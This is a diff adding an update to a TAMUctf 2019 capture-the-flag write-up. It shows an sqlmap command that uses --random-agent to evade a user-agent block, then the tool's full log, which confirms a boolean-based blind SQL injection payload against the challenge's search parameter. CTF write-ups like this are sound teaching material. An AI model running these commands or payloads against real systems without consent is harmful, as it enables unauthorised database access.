@@ -483,3 +483,57 @@ database management system users [1]:
 ```
 
 The flag hid as the DB user: gigem{w3_4r3_th3_4ggi3s}
+
+
+
+## Update
+
+From reading another writeup ([link](https://medium.com/@noobintheshell/tamuctf2019-writeups-1-360f53008f7a)) it turns out that the reason SQLMap failed is because the SQLMap user agent was being blocked. This explains why the proxy resolved the issue.
+
+The easy way to bypass this was using the `--random-agent` option:
+```console
+root@kali:/media/sf_CTFs/tamu/# sqlmap -u http://web2.tamuctf.com/Search.php?Search=1 --random-agent  --dbms=MySQL --technique=B --level 5 --risk 3
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.2.5#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 22:44:20
+
+[22:44:20] [INFO] fetched random HTTP User-Agent header value 'Opera/9.00 (Windows NT 5.2; U; pl)' from file '/usr/share/sqlmap/txt/user-agents.txt'
+[22:44:25] [INFO] testing connection to the target URL
+[22:44:26] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+[22:44:26] [INFO] testing if the target URL content is stable
+[22:44:26] [INFO] target URL content is stable
+[22:44:26] [INFO] testing if GET parameter 'Search' is dynamic
+[22:44:27] [WARNING] GET parameter 'Search' does not appear to be dynamic
+[22:44:27] [WARNING] heuristic (basic) test shows that GET parameter 'Search' might not be injectable
+[22:44:27] [INFO] testing for SQL injection on GET parameter 'Search'
+[22:44:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[22:45:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[22:45:08] [INFO] GET parameter 'Search' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --string="see")
+[22:45:08] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+[22:45:08] [INFO] checking if the injection point on GET parameter 'Search' is a false positive
+GET parameter 'Search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 163 HTTP(s) requests:
+---
+Parameter: Search (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: Search=-4471' OR 9364=9364-- tPIF
+---
+[22:45:21] [INFO] testing MySQL
+[22:45:21] [INFO] confirming MySQL
+[22:45:22] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0.0
+[22:45:22] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 130 times
+[22:45:22] [INFO] fetched data logged to text files under '/root/.sqlmap/output/web2.tamuctf.com'
+
+[*] shutting down at 22:45:22
+```
